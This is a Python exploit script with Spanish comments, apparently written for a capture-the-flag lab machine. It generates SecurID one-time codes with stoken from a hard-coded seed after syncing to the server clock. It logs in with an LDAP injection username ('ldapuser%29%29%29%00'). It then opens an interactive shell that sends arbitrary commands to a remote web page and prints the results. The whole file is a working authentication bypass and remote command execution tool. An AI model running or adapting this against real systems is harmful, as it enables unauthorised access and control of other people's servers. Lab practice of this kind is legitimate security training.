#!/usr/bin/env python3
import logging, signal, sys, requests, time, re
from cmd import Cmd
from subprocess import Popen, PIPE, CalledProcessError
from argparse import ArgumentParser

logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")

def exit_handler(sig, frame):
	print("\n[!] Saliendo de la aplicacion...")
	sys.exit(1)
	
#evento para controlar la salida de la aplicacion con Ctrl+C
signal.signal(signal.SIGINT, exit_handler)

class OTPGenerator:
    """Genera OTPs sincronizados con el servidor remoto usando stoken."""

    def __init__(self, seed: str, pin: str = "0000", offset: float = 0):
        self.seed = seed
        self.pin = pin
        self.offset = int(offset)

    def generate(self) -> str:
        try:
            process = Popen(
                [
                    "stoken",
                    f"--token={self.seed}",
                    f"--use-time=-{self.offset}",
                    f"--pin={self.pin}",
                    "--force",
                ],
                stdout=PIPE,
                stderr=PIPE,
            )
            out, err = process.communicate(timeout=5)
            if process.returncode != 0:
                raise CalledProcessError(process.returncode, 'stoken', output=out, stderr=err)
            return out.decode().strip()
        except FileNotFoundError:
            logging.error("No se encontró el binario 'stoken'. ¿Está instalado?")
        except CalledProcessError as e:
            logging.error(f"Error en 'stoken': {e.stderr.decode().strip()}")
        except Exception as e:
            logging.exception("Error inesperado generando OTP")
        return "000000"


class CTFClient:
    """Cliente HTTP que gestiona sesión y autenticación para una máquina CTF."""

    def __init__(self, login_url: str, cmd_url: str, username: str, otp_generator: OTPGenerator, proxy: dict = None):
        self.login_url = login_url
        self.cmd_url = cmd_url
        self.username = username
        self.session = requests.Session()
        self.otp_gen = otp_generator
        if proxy:
            self.session.proxies = proxy

    def sync_time(self, time_url: str):
        try:
            r = self.session.get(time_url, timeout=5)
            r.raise_for_status()
            server_date = r.headers.get("Date")
            if not server_date:
                raise ValueError("Falta cabecera 'Date'")
            server_time = time.strptime(server_date, "%a, %d %b %Y %H:%M:%S %Z")
            local_time = time.gmtime()
            offset = time.mktime(local_time) - time.mktime(server_time)
            self.otp_gen.offset = int(offset)
            logging.info(f"Offset calculado: {offset:.2f} seg")
        except requests.exceptions.Timeout:
            logging.error("La solicitud para sincronizar la hora agotó el tiempo de espera")
        except requests.exceptions.HTTPError as e:
            logging.error(f"Error HTTP al obtener la hora del servidor: {e}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Error de red al conectar con el servidor: {e}")
        except ValueError as ve:
            logging.error(f"Error en el formato o contenido de la cabecera 'Date': {ve}")
        except Exception as e:
            logging.exception(f"Error inesperado durante la sincronización de hora: {e}")

    def authenticate(self):
        otp = self.otp_gen.generate()
        try:
            resp = self.session.post(self.login_url, data={
                "inputUsername": self.username,
                "inputOTP": otp
            }, timeout=5)
            resp.raise_for_status()
            if "Invalid" in resp.text:
                logging.warning("Login rechazado: OTP inválido.")
            else:
                logging.info("Autenticación exitosa.")
        except requests.RequestException as e:
            logging.error(f"Error durante login: {e}")

    def run_command(self, command: str):
        otp = self.otp_gen.generate()
        try:
            resp = self.session.post(self.cmd_url, data={
                "inputCmd": command,
                "inputOTP": otp
            }, timeout=5)
            resp.raise_for_status()
            result = re.findall(r"<pre>(.*?)</pre>", resp.text, re.DOTALL)
            if result:
                print(result[0].rstrip())
            else:
                print("[!] Sin salida visible")
        except requests.RequestException as e:
            logging.error(f"Fallo al ejecutar comando: {e}")


class CTFShell(Cmd):
    """Shell interactiva que permite enviar comandos a la máquina remota."""

    def __init__(self, client: CTFClient):
        super().__init__()
        self.client = client
        self.prompt = "CTF> "

    def default(self, line: str):
        self.client.run_command(line)

    def do_exit(self, _):
        print("Saliendo...")
        return True


def parse_args():
    parser = ArgumentParser(description="Shell CTF interactiva con OTP dinámico")
    parser.add_argument("--host", default="http://10.10.10.122", help="Host de la máquina")
    parser.add_argument("--login", default="/login.php")
    parser.add_argument("--cmd", default="/page.php")
    parser.add_argument("--username", default="ldapuser%29%29%29%00")
    parser.add_argument("--seed", default=285449490011372370317401734215712056720371131272577450204172154164546722716756524)
    parser.add_argument("--pin", default="0000")
    parser.add_argument("--proxy", help="Proxy HTTP, ejemplo: http://127.0.0.1:8080")
    return parser.parse_args()


def main():
    args = parse_args()
    proxy_dict = {"http": args.proxy} if args.proxy else None

    otp_gen = OTPGenerator(seed=args.seed, pin=args.pin)
    client = CTFClient(
        login_url=args.host + args.login,
        cmd_url=args.host + args.cmd,
        username=args.username,
        otp_generator=otp_gen,
        proxy=proxy_dict,
    )

    client.sync_time(time_url=args.host + args.login)
    client.authenticate()
    shell = CTFShell(client)
    shell.cmdloop()


if __name__ == "__main__":
    main()
